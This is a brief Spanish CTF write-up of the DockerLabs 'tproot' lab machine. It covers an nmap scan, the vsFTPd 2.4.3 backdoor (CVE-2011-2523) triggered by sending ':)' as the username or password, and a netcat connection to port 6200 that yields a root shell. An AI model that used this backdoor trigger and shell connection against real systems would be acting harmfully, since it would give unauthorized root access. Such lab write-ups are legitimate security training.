enumeración
```
namp -sV -sC -O -p- 172.17.0.2
```
<figure> <img src="security/writeups/dockerlabs/tproot/attachments/fig1.png" alt="fig1"> </figure>

### HTTP
En 80 tenemos apache por defecto y no se ve nada relevante

<figure> <img src="security/writeups/dockerlabs/tproot/attachments/fig2.png" alt="fig2"> </figure>
### FTP
En FTP tenemos anonymous con un problema al acceder a la raiz del directorio. Vemos que tenemos la versión 2.4.3 de vsFTPd y tiene un backdoor (CVE-2011-2523). Nos conectamos usando en el usuario o contraseña los caracteres `:)`

<figure> <img src="security/writeups/dockerlabs/tproot/attachments/fig3.png" alt="fig3"> </figure> 

Esto hará que abra el puerto 6200 para conectarse y este proceso corre con usuario root.

Por lo tanto nos conectamos con `nc 172.17.0.2 6200`
<figure> <img src="security/writeups/dockerlabs/tproot/attachments/fig5.png" alt="fig5"> </figure>

Flag root

<figure> <img src="security/writeups/dockerlabs/tproot/attachments/fig6.png" alt="fig6"> </figure>